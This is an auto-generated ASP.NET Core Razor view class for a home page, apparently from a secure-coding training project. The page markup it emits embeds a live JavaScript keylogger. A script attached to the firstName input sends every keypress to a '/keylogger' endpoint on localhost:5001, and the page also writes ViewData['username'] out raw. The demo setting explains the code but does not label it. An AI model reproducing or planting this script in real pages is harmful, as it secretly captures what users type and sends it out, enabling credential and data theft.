#pragma checksum "/Users/mganitombalak/Github/training/SecureCoding/SecureCoding/Views/Home/Index.cshtml" "{ff1816ec-aa5e-4d10-87f7-6f4963833460}" "21d1e4c4dd8552b51745e09cef2601bec5c78caf"
// <auto-generated/>
#pragma warning disable 1591
[assembly: global::Microsoft.AspNetCore.Razor.Hosting.RazorCompiledItemAttribute(typeof(AspNetCore.Views_Home_Index), @"mvc.1.0.view", @"/Views/Home/Index.cshtml")]
[assembly:global::Microsoft.AspNetCore.Mvc.Razor.Compilation.RazorViewAttribute(@"/Views/Home/Index.cshtml", typeof(AspNetCore.Views_Home_Index))]
namespace AspNetCore
{
    #line hidden
    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Threading.Tasks;
    using Microsoft.AspNetCore.Mvc;
    using Microsoft.AspNetCore.Mvc.Rendering;
    using Microsoft.AspNetCore.Mvc.ViewFeatures;
#line 1 "/Users/mganitombalak/Github/training/SecureCoding/SecureCoding/Views/_ViewImports.cshtml"
using SecureCoding;

#line default
#line hidden
#line 2 "/Users/mganitombalak/Github/training/SecureCoding/SecureCoding/Views/_ViewImports.cshtml"
using SecureCoding.Models;

#line default
#line hidden
    [global::Microsoft.AspNetCore.Razor.Hosting.RazorSourceChecksumAttribute(@"SHA1", @"21d1e4c4dd8552b51745e09cef2601bec5c78caf", @"/Views/Home/Index.cshtml")]
    [global::Microsoft.AspNetCore.Razor.Hosting.RazorSourceChecksumAttribute(@"SHA1", @"7819cbc8a5dc59c84d63a7212f0b75debe54c5a7", @"/Views/_ViewImports.cshtml")]
    public class Views_Home_Index : global::Microsoft.AspNetCore.Mvc.Razor.RazorPage<dynamic>
    {
        #pragma warning disable 1998
        public async override global::System.Threading.Tasks.Task ExecuteAsync()
        {
#line 1 "/Users/mganitombalak/Github/training/SecureCoding/SecureCoding/Views/Home/Index.cshtml"
  
    ViewData["Title"] = "Home Page";

#line default
#line hidden
            BeginContext(42, 37, true);
            WriteLiteral("\n<div class=\"text-center\">\n\n    <div>");
            EndContext();
            BeginContext(80, 20, false);
#line 7 "/Users/mganitombalak/Github/training/SecureCoding/SecureCoding/Views/Home/Index.cshtml"
    Write(ViewData["username"]);

#line default
#line hidden
            EndContext();
            BeginContext(100, 402, true);
            WriteLiteral(@"</div>
    <input id=""firstName"" type=""text""/>
    <input id=""lastName"" type=""text""/>
    
    <script>
    function sendKeyPress(e) { 
        var x = new XMLHttpRequest();x.open(""GET"",""http://localhost:5001/keylogger?key=""+e,true);x.send(); 
    }
        var elem=document.querySelector(""#firstName"");
        elem.addEventListener(""keypress"",function(e){sendKeyPress(e.key)});
    </script>
</div>
");
            EndContext();
        }
        #pragma warning restore 1998
        [global::Microsoft.AspNetCore.Mvc.Razor.Internal.RazorInjectAttribute]
        public global::Microsoft.AspNetCore.Mvc.ViewFeatures.IModelExpressionProvider ModelExpressionProvider { get; private set; }
        [global::Microsoft.AspNetCore.Mvc.Razor.Internal.RazorInjectAttribute]
        public global::Microsoft.AspNetCore.Mvc.IUrlHelper Url { get; private set; }
        [global::Microsoft.AspNetCore.Mvc.Razor.Internal.RazorInjectAttribute]
        public global::Microsoft.AspNetCore.Mvc.IViewComponentHelper Component { get; private set; }
        [global::Microsoft.AspNetCore.Mvc.Razor.Internal.RazorInjectAttribute]
        public global::Microsoft.AspNetCore.Mvc.Rendering.IJsonHelper Json { get; private set; }
        [global::Microsoft.AspNetCore.Mvc.Razor.Internal.RazorInjectAttribute]
        public global::Microsoft.AspNetCore.Mvc.Rendering.IHtmlHelper<dynamic> Html { get; private set; }
    }
}
#pragma warning restore 1591
